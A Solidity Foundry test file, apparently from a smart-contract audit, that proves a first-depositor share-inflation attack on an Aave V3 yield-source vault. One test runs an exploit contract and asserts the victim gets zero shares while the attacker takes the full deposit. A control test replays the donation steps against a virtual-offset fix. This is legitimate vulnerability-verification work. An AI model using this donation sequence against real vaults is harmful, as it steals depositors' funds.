// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {
    AToken,
    AaveV3YieldSource,
    Exploit,
    MockPool,
    Underlying,
    Victim
} from "./24991-h-01-a-malicious-early-userattacker-can-manipulate-the-vault.sol";

contract Finding24991Test is Test {
    uint256 internal constant DONATION = 10_000 ether;
    uint256 internal constant VICTIM_DEPOSIT = 9_999 ether;

    function test_exploit_second_depositor_gets_zero_shares() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.victimShares(), 0, "second depositor minted 0 shares");
        assertEq(e.ys().balanceOf(address(e.victim())), 0, "victim share balance");
        assertEq(e.profit(), VICTIM_DEPOSIT, "attacker profit is the victim deposit");
        assertEq(
            e.underlying().balanceOf(address(0x1111111111111111111111111111111111111111)),
            VICTIM_DEPOSIT,
            "9,999e18 underlying taken"
        );
    }

    function test_control_virtual_offset_mints_shares() public {
        Underlying underlying = new Underlying();
        AToken aToken = new AToken();
        MockPool pool = new MockPool(underlying, aToken);
        AaveV3YieldSource ys = new AaveV3YieldSource(underlying, aToken, pool, true);
        Victim victim = new Victim();

        underlying.mint(address(this), 1 + DONATION);
        underlying.mint(address(victim), VICTIM_DEPOSIT);

        underlying.approve(address(ys), 1);
        ys.supplyTokenTo(1, address(this));
        assertEq(ys.balanceOf(address(this)), 1, "first share");

        underlying.approve(address(pool), DONATION);
        pool.supply(address(underlying), DONATION, address(this));
        aToken.transfer(address(ys), DONATION);

        victim.deposit(ys, VICTIM_DEPOSIT);
        uint256 shares = ys.balanceOf(address(victim));
        assertGt(shares, 0, "offset mints shares");
        assertGt(shares, 100_000, "shares are not dust");
    }
}
